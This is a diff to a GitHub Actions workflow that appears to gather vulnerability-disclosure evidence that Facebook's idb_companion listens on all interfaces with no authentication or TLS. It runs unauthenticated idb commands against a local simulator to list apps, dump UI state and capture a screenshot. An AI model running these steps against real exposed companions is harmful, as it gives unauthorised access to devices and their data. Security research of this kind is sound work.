@@ -15,50 +15,60 @@ jobs:
           sw_vers
           xcrun --version
           xcrun simctl list runtimes | head -20
-          which brew
-          brew --version
+
+      - name: Set up Python 3.11
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install fb-idb python client
+        run: |
+          python3 -m venv /Users/runner/idb-venv
+          /Users/runner/idb-venv/bin/pip install --quiet fb-idb
+          /Users/runner/idb-venv/bin/idb --help | head -10 || true
 
       - name: Install idb-companion via brew
         run: |
           brew tap facebook/fb
           brew install idb-companion
           which idb_companion
-          idb_companion --help | head -25 || true
 
       - name: Show vulnerable code references (static evidence)
         run: |
-          mkdir -p evidence
           git clone --depth 1 https://github.com/facebook/idb.git /tmp/idb-src
           cd /tmp/idb-src
-          echo "=== HEAD ===" | tee /Users/runner/work/evidence-static.txt
-          git log --oneline -1 | tee -a /Users/runner/work/evidence-static.txt
-          echo "" | tee -a /Users/runner/work/evidence-static.txt
-          echo "=== BIND ADDRESS (IDBPortsConfiguration.swift) ===" | tee -a /Users/runner/work/evidence-static.txt
-          grep -n '\.hostAndPort\|grpcDomainSocket\|grpcPort\|tlsCertPath' idb_companion/Configuration/IDBPortsConfiguration.swift | tee -a /Users/runner/work/evidence-static.txt
-          echo "" | tee -a /Users/runner/work/evidence-static.txt
-          echo "=== DEFAULTS (main.m) ===" | tee -a /Users/runner/work/evidence-static.txt
-          grep -nE 'grpc-port|tls-cert-path|grpc-domain-sock' idb_companion/main.m | tee -a /Users/runner/work/evidence-static.txt
-          echo "" | tee -a /Users/runner/work/evidence-static.txt
-          echo "=== AUTH INTERCEPTORS (should be empty) ===" | tee -a /Users/runner/work/evidence-static.txt
-          ls idb_companion/SwiftServer/Interceptors/ | tee -a /Users/runner/work/evidence-static.txt
-          echo "" | tee -a /Users/runner/work/evidence-static.txt
-          echo "=== 45 RPC METHODS (proto/idb.proto) ===" | tee -a /Users/runner/work/evidence-static.txt
-          grep -c '^  rpc ' proto/idb.proto | tee -a /Users/runner/work/evidence-static.txt
-          echo "" | tee -a /Users/runner/work/evidence-static.txt
-          echo "=== SAMPLE RPC list ===" | tee -a /Users/runner/work/evidence-static.txt
-          grep '^  rpc ' proto/idb.proto | head -30 | tee -a /Users/runner/work/evidence-static.txt
+          mkdir -p /Users/runner/evidence
+          OUT=/Users/runner/evidence/evidence-static.txt
+          {
+            echo "=== HEAD ==="
+            git log --oneline -1
+            echo ""
+            echo "=== BIND ADDRESS (IDBPortsConfiguration.swift) ==="
+            grep -n '\.hostAndPort\|grpcDomainSocket\|grpcPort\|tlsCertPath' idb_companion/Configuration/IDBPortsConfiguration.swift
+            echo ""
+            echo "=== INTERCEPTORS (no auth interceptor present) ==="
+            ls idb_companion/SwiftServer/Interceptors/
+            echo ""
+            echo "=== CompanionServiceInterceptors.swift (what does it do?) ==="
+            head -80 idb_companion/SwiftServer/Interceptors/CompanionServiceInterceptors.swift
+            echo ""
+            echo "=== 45 RPC methods exposed (proto/idb.proto) ==="
+            grep -c '^  rpc ' proto/idb.proto
+            grep '^  rpc ' proto/idb.proto
+          } > "$OUT"
+          cat "$OUT" | head -80
 
-      - name: Create + boot iOS Simulator
+      - name: Create + boot iOS Simulator, run companion, run UNAUTH client (single step so companion stays alive)
         run: |
           set -e
-          # Pick newest iOS runtime + a device type the runtime explicitly supports
+          mkdir -p /Users/runner/evidence
+          # Pick newest iOS runtime + a supported iPhone device type
           PAIR=$(xcrun simctl list runtimes -j | python3 -c "
           import json,sys
           d=json.load(sys.stdin)
           rts=[r for r in d['runtimes'] if r['isAvailable'] and 'iOS' in r['name']]
           rts.sort(key=lambda r: r['version'], reverse=True)
           r=rts[0]
-          # supportedDeviceTypes is a list of {identifier, name, productFamily}
           dts=[d for d in r.get('supportedDeviceTypes', []) if 'iPhone' in d.get('name','')]
           if not dts:
               dts=r['supportedDeviceTypes']
@@ -66,100 +76,81 @@ jobs:
           ")
           RUNTIME=${PAIR%%|*}
           DEVICE_TYPE=${PAIR##*|}
-          echo "Using runtime: $RUNTIME"
-          echo "Using device type: $DEVICE_TYPE"
+          echo "Runtime: $RUNTIME   Device: $DEVICE_TYPE"
           UDID=$(xcrun simctl create "PoC-iPhone" "$DEVICE_TYPE" "$RUNTIME")
-          echo "Created sim UDID: $UDID"
-          echo "$UDID" > /Users/runner/work/sim-udid.txt
+          echo "UDID=$UDID"
+          echo "$UDID" > /Users/runner/evidence/sim-udid.txt
           xcrun simctl boot "$UDID"
           xcrun simctl bootstatus "$UDID" -b
-          xcrun simctl list devices booted
 
-      - name: Start idb_companion in background (DEFAULT ARGS, NO TLS, NO AUTH)
-        run: |
-          UDID=$(cat /Users/runner/work/sim-udid.txt)
-          mkdir -p /Users/runner/work/companion-logs
+          # Start companion in background — disown so step end doesn't kill it
           nohup idb_companion --udid "$UDID" \
-            > /Users/runner/work/companion-logs/stdout.log \
-            2> /Users/runner/work/companion-logs/stderr.log &
-          echo $! > /Users/runner/work/companion-logs/pid.txt
-          sleep 6
-          echo "=== companion PID ==="
-          cat /Users/runner/work/companion-logs/pid.txt
-          echo "=== stdout ==="
-          cat /Users/runner/work/companion-logs/stdout.log || true
-          echo "=== stderr ==="
-          cat /Users/runner/work/companion-logs/stderr.log || true
+            > /Users/runner/evidence/companion-stdout.log \
+            2> /Users/runner/evidence/companion-stderr.log &
+          COMPANION_PID=$!
+          disown
+          echo "Companion PID: $COMPANION_PID"
+          sleep 8
 
-      - name: PROOF 1 — bind address (netstat + lsof)
-        run: |
-          echo "=== netstat -an | grep 10882 ===" | tee /Users/runner/work/evidence-bind.txt
-          netstat -an | grep 10882 | tee -a /Users/runner/work/evidence-bind.txt || true
-          echo "" | tee -a /Users/runner/work/evidence-bind.txt
-          echo "=== lsof -nP -iTCP:10882 -sTCP:LISTEN ===" | tee -a /Users/runner/work/evidence-bind.txt
-          lsof -nP -iTCP:10882 -sTCP:LISTEN | tee -a /Users/runner/work/evidence-bind.txt || true
-          echo ""
-          echo "Expected: bind to *.10882 or [::].10882 (NOT 127.0.0.1.10882)"
-          echo "  - *.10882 / [::].10882  =>  EXPOSED on all interfaces (insecure default)"
-          echo "  - 127.0.0.1.10882 / [::1].10882  =>  localhost-only (would be secure)"
+          # PROOF 1 — verify bind
+          {
+            echo "=== ps companion ==="
+            ps -p "$COMPANION_PID" -o pid,ppid,stat,command || echo "companion not running!"
+            echo ""
+            echo "=== netstat -an | grep 10882 ==="
+            netstat -an | grep 10882 || echo "(no listener? trying lsof)"
+            echo ""
+            echo "=== lsof -nP -iTCP:10882 ==="
+            lsof -nP -iTCP:10882 || true
+            echo ""
+            echo "=== EXPECTED ==="
+            echo "Bind to *.10882 or [::].10882  =>  EXPOSED on all interfaces (the bug)"
+            echo "Bind to 127.0.0.1.10882        =>  localhost-only (would be secure)"
+          } | tee /Users/runner/evidence/evidence-bind.txt
 
-      - name: Install fb-idb python client (separate process simulates attacker)
-        run: |
-          python3 -m venv /Users/runner/work/idb-client-venv
-          source /Users/runner/work/idb-client-venv/bin/activate
-          pip install --quiet fb-idb
-          which idb
-          idb --help | head -10 || true
+          # PROOF 2 — unauth list-targets
+          {
+            echo "=== IDB_COMPANION=127.0.0.1:10882 idb list-targets (NO AUTH, NO TLS) ==="
+            IDB_COMPANION=127.0.0.1:10882 /Users/runner/idb-venv/bin/idb list-targets 2>&1
+          } | tee /Users/runner/evidence/evidence-unauth-list.txt
 
-      - name: PROOF 2 — unauthenticated list-targets via gRPC
-        run: |
-          source /Users/runner/work/idb-client-venv/bin/activate
-          echo "=== IDB_COMPANION=127.0.0.1:10882 idb list-targets ===" | tee /Users/runner/work/evidence-unauth-list.txt
-          IDB_COMPANION=127.0.0.1:10882 idb list-targets 2>&1 | tee -a /Users/runner/work/evidence-unauth-list.txt
-          echo "(no auth credentials provided, no TLS, daemon responded)"
+          # PROOF 3 — describe (target metadata exfil)
+          {
+            echo "=== IDB_COMPANION=127.0.0.1:10882 idb describe --udid $UDID ==="
+            IDB_COMPANION=127.0.0.1:10882 /Users/runner/idb-venv/bin/idb describe --udid "$UDID" 2>&1
+          } | tee /Users/runner/evidence/evidence-unauth-describe.txt
 
-      - name: PROOF 3 — unauthenticated describe (target metadata)
-        run: |
-          source /Users/runner/work/idb-client-venv/bin/activate
-          UDID=$(cat /Users/runner/work/sim-udid.txt)
-          echo "=== IDB_COMPANION=127.0.0.1:10882 idb describe --udid $UDID ===" | tee /Users/runner/work/evidence-unauth-describe.txt
-          IDB_COMPANION=127.0.0.1:10882 idb describe --udid "$UDID" 2>&1 | tee -a /Users/runner/work/evidence-unauth-describe.txt
+          # PROOF 4 — list-apps (data exposure)
+          {
+            echo "=== IDB_COMPANION=127.0.0.1:10882 idb list-apps --udid $UDID ==="
+            IDB_COMPANION=127.0.0.1:10882 /Users/runner/idb-venv/bin/idb list-apps --udid "$UDID" 2>&1 | head -40
+          } | tee /Users/runner/evidence/evidence-unauth-listapps.txt
 
-      - name: PROOF 4 — unauthenticated list-apps (data exposure)
-        run: |
-          source /Users/runner/work/idb-client-venv/bin/activate
-          UDID=$(cat /Users/runner/work/sim-udid.txt)
-          echo "=== IDB_COMPANION=127.0.0.1:10882 idb list-apps --udid $UDID ===" | tee /Users/runner/work/evidence-unauth-listapps.txt
-          IDB_COMPANION=127.0.0.1:10882 idb list-apps --udid "$UDID" 2>&1 | head -50 | tee -a /Users/runner/work/evidence-unauth-listapps.txt
+          # PROOF 5 — accessibility UI hierarchy (full screen state disclosure)
+          {
+            echo "=== IDB_COMPANION=127.0.0.1:10882 idb ui describe-all ==="
+            IDB_COMPANION=127.0.0.1:10882 /Users/runner/idb-venv/bin/idb ui describe-all --udid "$UDID" 2>&1 | head -80
+          } | tee /Users/runner/evidence/evidence-unauth-ui.txt
 
-      - name: PROOF 5 — unauthenticated file system access (ls in root container)
-        run: |
-          source /Users/runner/work/idb-client-venv/bin/activate
-          UDID=$(cat /Users/runner/work/sim-udid.txt)
-          echo "=== IDB_COMPANION=127.0.0.1:10882 idb file ls --bundle-id com.apple.Maps / ===" | tee /Users/runner/work/evidence-unauth-fs.txt
-          IDB_COMPANION=127.0.0.1:10882 idb file ls --bundle-id com.apple.Maps --udid "$UDID" / 2>&1 | tee -a /Users/runner/work/evidence-unauth-fs.txt || echo "(may fail if Maps not present, try another)"
+          # PROOF 6 — screenshot capture from outside
+          {
+            echo "=== idb screenshot ==="
+            IDB_COMPANION=127.0.0.1:10882 /Users/runner/idb-venv/bin/idb screenshot --udid "$UDID" /Users/runner/evidence/screenshot-exfiltrated.png 2>&1
+            ls -la /Users/runner/evidence/screenshot-exfiltrated.png 2>&1 || true
+            file /Users/runner/evidence/screenshot-exfiltrated.png 2>&1 || true
+          } | tee /Users/runner/evidence/evidence-unauth-screenshot.txt
 
-      - name: PROOF 6 — accessibility info (full UI hierarchy disclosure)
-        run: |
-          source /Users/runner/work/idb-client-venv/bin/activate
-          UDID=$(cat /Users/runner/work/sim-udid.txt)
-          echo "=== IDB_COMPANION=127.0.0.1:10882 idb ui describe-all ===" | tee /Users/runner/work/evidence-unauth-ui.txt
-          IDB_COMPANION=127.0.0.1:10882 idb ui describe-all --udid "$UDID" 2>&1 | head -100 | tee -a /Users/runner/work/evidence-unauth-ui.txt || true
+          # Final state of companion
+          {
+            echo "=== companion stdout ==="
+            cat /Users/runner/evidence/companion-stdout.log || true
+            echo ""
+            echo "=== companion stderr (final) ==="
+            cat /Users/runner/evidence/companion-stderr.log | head -40 || true
+          } > /Users/runner/evidence/evidence-companion-final.log
 
-      - name: PROOF 7 — screenshot capture
-        run: |
-          source /Users/runner/work/idb-client-venv/bin/activate
-          UDID=$(cat /Users/runner/work/sim-udid.txt)
-          IDB_COMPANION=127.0.0.1:10882 idb screenshot --udid "$UDID" /Users/runner/work/screenshot-exfil.png 2>&1 | tee /Users/runner/work/evidence-unauth-screenshot.txt
-          ls -la /Users/runner/work/screenshot-exfil.png || echo "screenshot capture failed"
-
-      - name: Kill companion and dump final state
-        if: always()
-        run: |
-          PID=$(cat /Users/runner/work/companion-logs/pid.txt 2>/dev/null || echo "")
-          if [ -n "$PID" ]; then kill "$PID" 2>/dev/null || true; fi
-          echo "=== companion stderr (full) ===" | tee /Users/runner/work/evidence-companion-stderr.log
-          cat /Users/runner/work/companion-logs/stderr.log 2>/dev/null | tee -a /Users/runner/work/evidence-companion-stderr.log || true
+          # Stop the companion cleanly
+          kill "$COMPANION_PID" 2>/dev/null || true
 
       - name: Upload evidence artifact
         if: always()
@@ -167,8 +158,4 @@ jobs:
         with:
           name: idb-unauth-poc-evidence
           path: |
-            /Users/runner/work/evidence-*.txt
-            /Users/runner/work/evidence-*.log
-            /Users/runner/work/screenshot-exfil.png
-            /Users/runner/work/companion-logs/
-            /Users/runner/work/sim-udid.txt
+            /Users/runner/evidence/
